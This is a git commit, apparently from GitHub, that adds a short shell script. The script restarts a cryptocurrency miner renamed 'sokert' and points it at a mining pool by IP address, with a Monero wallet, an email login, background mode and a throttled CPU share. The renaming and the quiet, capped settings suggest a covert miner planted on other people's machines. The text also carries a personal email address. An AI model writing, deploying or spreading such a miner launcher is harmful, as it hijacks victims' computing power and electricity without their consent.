43b9721c1df8fa7b9b74a4508e44db101fec9f07
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-04-09 20:29:21 +0200

    Add files via upload

---
+++ 40.sh
@@ -0,0 +1,3 @@
+pkill sokert
+sleep 7
+sokert -o 116.203.121.28:2128 -u 41tYiqHAhGRF4YNP8q9CrNECEYnjiycnML3Y13nXKKKi6duuiXQ5oTjiaYr1QZzxnrRSqA7iukACzU44Lakv5AXPLUaMc3g --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=50 --av=1 --variant -1
